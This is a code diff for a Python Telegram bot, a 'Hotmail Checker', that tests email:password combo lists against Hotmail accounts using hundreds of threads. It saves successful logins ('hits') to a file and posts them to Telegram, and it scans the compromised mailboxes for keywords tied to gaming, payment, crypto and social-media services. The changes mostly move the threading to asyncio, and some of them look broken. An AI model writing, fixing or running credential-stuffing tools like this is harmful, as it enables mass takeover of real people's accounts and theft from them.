@@ -8,7 +8,7 @@ import threading
 import concurrent.futures
 import random
 import re
-import json
+import asyncio
 from threading import Lock, Semaphore
 
 from colorama import init
@@ -17,12 +17,13 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 
 from services import services
 
+# ====================== BOT TOKEN ======================
 TOKEN = os.getenv("TOKEN")
-if not TOKEN:
-    print("❌ TOKEN set nahi hai!")
+if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
+    print("❌ TOKEN environment variable set nahi hai! Railway Variables mein TOKEN daal do.")
     sys.exit(1)
 
-print("✅ Token loaded! Video style bot starting...")
+print("✅ Token loaded successfully! Video style bot starting...")
 
 lock = threading.Lock()
 hit = bad = retry = processed = total_combos = 0
@@ -31,23 +32,29 @@ checked_accounts = set()
 rate_limit_semaphore = Semaphore(500)
 progress_message_id = None
 
-user_data = {}
+user_data = {}  # user_id -> settings
 
 init(autoreset=True)
 
 CATEGORIES = {
-    "Gaming": ["Steam", "Xbox", "PlayStation", "Epic Games", "Rockstar", "EA Sports", "Ubisoft", "Blizzard", "Riot Games", "Valorant", "Genshin Impact", "PUBG", "Free Fire", "Mobile Legends", "Call of Duty", "Fortnite", "Roblox", "Minecraft", "Supercell", "Nintendo", "Origin (EA)", "Battle.net", "GOG"],
-    "Streaming": ["Netflix", "Spotify", "Twitch", "YouTube", "Vimeo", "Disney+", "Hulu", "HBO Max", "Amazon Prime", "Apple TV+", "Crunchyroll"],
-    "Shopping": ["Amazon", "eBay", "Shopify", "Etsy", "AliExpress", "Walmart", "Target", "Best Buy", "Newegg", "Wish", "Shein", "Zalando", "Trendyol"],
-    "Payment & Finance": ["PayPal", "Binance", "Coinbase", "Kraken", "Bitfinex", "OKX", "Bybit", "Bitkub", "Revolut", "TransferWise", "Venmo", "Cash App"],
-    "Social Media": ["Facebook", "Instagram", "TikTok", "Twitter", "LinkedIn", "Pinterest", "Reddit", "Snapchat", "VK", "WeChat"],
-    "Messaging": ["WhatsApp", "Telegram", "Discord", "Signal", "Line"]
+    "Gaming": ["Steam", "Xbox", "PlayStation", "Epic Games", "Rockstar", "EA Sports", "Ubisoft", "Blizzard", "Riot Games", "Valorant", "Genshin Impact", "PUBG", "Free Fire", "Mobile Legends", "Call of Duty", "Fortnite", "Roblox", "Minecraft", "Supercell", "Nintendo"],
+    "Streaming": ["Netflix", "Spotify", "Twitch", "YouTube", "Disney+", "Hulu", "Amazon Prime"],
+    "Shopping": ["Amazon", "eBay", "Shopify", "Etsy", "AliExpress"],
+    "Payment & Finance": ["PayPal", "Binance", "Coinbase"],
+    "Social Media": ["Facebook", "Instagram", "TikTok", "Twitter"],
+    "Messaging": ["WhatsApp", "Telegram", "Discord"]
 }
 
 def create_progress_bar(percentage, length=25):
     filled = int(length * percentage / 100)
     bar = "█" * filled + "░" * (length - filled)
     return f"[{bar}] {percentage:.1f}%"
+
+async def send_message_safe(context, chat_id, text, parse_mode='HTML'):
+    try:
+        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
+    except Exception as e:
+        print(f"Send message error: {e}")
 
 async def update_progress_message(context, chat_id):
     global progress_message_id
@@ -74,7 +81,7 @@ async def update_progress_message(context, chat_id):
                 progress_message_id = sent.message_id
         except:
             pass
-        time.sleep(5)
+        await asyncio.sleep(5)
 
 def get_flag(country_name):
     try:
@@ -134,8 +141,7 @@ def get_capture(email, password, token, cid, context, update):
 ⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
 𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
 """
-        context.bot.send_message(update.effective_chat.id, capture.strip(), parse_mode='HTML')
-
+        asyncio.run(send_message_safe(context, update.effective_chat.id, capture.strip()))
         with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
             f.write(capture + "\n" + "="*60 + "\n")
 
@@ -220,7 +226,7 @@ def validate_combo(file_path):
         f.write("\n".join(valid) + "\n")
     return len(valid)
 
-# ====================== MAIN MENU (Video Jaisa) ======================
+# ====================== KEYBOARDS (Video Jaisa) ======================
 def main_menu_keyboard():
     keyboard = [
         [InlineKeyboardButton("🔑 Keywords", callback_data="menu_keywords"), InlineKeyboardButton("⚡ Speed", callback_data="menu_speed")],
@@ -236,7 +242,6 @@ def main_menu_keyboard():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# ====================== KEYWORDS MENU (Video Jaisa) ======================
 def keywords_keyboard(selected, page=0, per_page=10):
     all_services = []
     for cat_services in CATEGORIES.values():
@@ -363,7 +368,10 @@ async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
             raise ValueError
         context.user_data['threads'] = threads
         await update.message.reply_text(f"🚀 Added to Queue! Position #1\nScanning will start automatically...")
-        threading.Thread(target=run_checker, args=(context, update), daemon=True).start()
+
+        # FIXED: Proper background execution
+        loop = asyncio.get_running_loop()
+        loop.run_in_executor(None, run_checker, context, update)
         return ConversationHandler.END
     except:
         await update.message.reply_text("❌ Valid number (1-1000) bhejo")
@@ -380,9 +388,11 @@ def run_checker(context, update):
         lines = [line.strip() for line in f if ":" in line]
     total_combos = len(lines)
 
-    context.bot.send_message(update.effective_chat.id, f"📊 Total combos: {total_combos}\nStarting check...")
+    asyncio.run(send_message_safe(context, update.effective_chat.id, f"📊 Total combos: {total_combos}\nStarting check..."))
 
-    threading.Thread(target=update_progress_message, args=(context, update.effective_chat.id), daemon=True).start()
+    # Start live progress bar
+    loop = asyncio.get_running_loop()
+    loop.run_in_executor(None, lambda: asyncio.run(update_progress_message(context, update.effective_chat.id)))
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=context.user_data.get('threads', 80)) as executor:
         for line in lines:
@@ -393,7 +403,7 @@ def run_checker(context, update):
                 continue
 
     time.sleep(5)
-    context.bot.send_message(update.effective_chat.id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}")
+    asyncio.run(send_message_safe(context, update.effective_chat.id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}"))
 
 def main():
     if not os.path.exists("Accounts"):
@@ -412,8 +422,8 @@ def main():
     )
     
     app.add_handler(conv_handler)
-    print("🤖 KAKASHI Hotmail Checker (Exact Video Style) is running... Send /start")
-    app.run_polling()
+    print("🤖 KAKASHI Hotmail Checker (Full Video Style - Fixed) is running... Send /start")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
